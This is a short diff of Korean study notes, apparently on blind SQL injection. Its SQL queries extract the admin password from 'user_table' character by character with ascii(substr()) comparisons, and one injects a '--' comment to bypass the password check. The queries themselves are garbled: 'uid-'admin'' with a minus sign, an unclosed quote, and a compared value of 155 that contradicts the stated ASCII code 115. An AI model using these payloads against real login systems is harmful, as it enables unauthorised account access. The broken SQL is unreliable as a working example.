@@ -1,1 +1,14 @@
 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's')
+SELECT * FROM user_table WHERE
+uid-'admin' and
+ascii(substr(upw,1,1))=114-- ' and
+upw=''; # False
+
+두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
+SELECT * FROM user_table
+WHERE uid='admin
+ and ascii(substr(upw,2,1))=155
+
+ SELECT * FROM user_table
+ WHERE uid='admin' and
+ ascii(substr(upw,2,1))=116
